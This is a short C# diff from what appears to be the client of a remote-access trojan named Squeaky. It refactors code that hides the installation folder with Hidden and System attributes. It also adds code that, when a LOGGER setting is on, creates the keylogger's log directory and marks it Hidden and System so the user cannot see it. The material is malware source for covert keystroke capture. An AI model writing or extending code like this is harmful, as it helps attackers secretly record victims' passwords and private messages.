@@ -59,7 +59,7 @@ namespace Squeaky.Client
 
             if (!string.IsNullOrEmpty(Settings.SUBDIRECTORY))
             {
-                DirectoryInfo di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLATION));
+                var di = new DirectoryInfo(Path.GetDirectoryName(Settings.INSTALLATION));
                 di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
             }
         }
@@ -119,6 +119,15 @@ namespace Squeaky.Client
                     Process.Start(startInfo);
 
                     Environment.Exit(2);
+                }
+
+                if (Settings.LOGGER)
+                {
+                    if (!Directory.Exists(Utilities.KeyLogger.LogDir))
+                    {
+                        var di = Directory.CreateDirectory(Utilities.KeyLogger.LogDir);
+                        di.Attributes |= FileAttributes.Hidden | FileAttributes.System;
+                    }
                 }
             }
         }
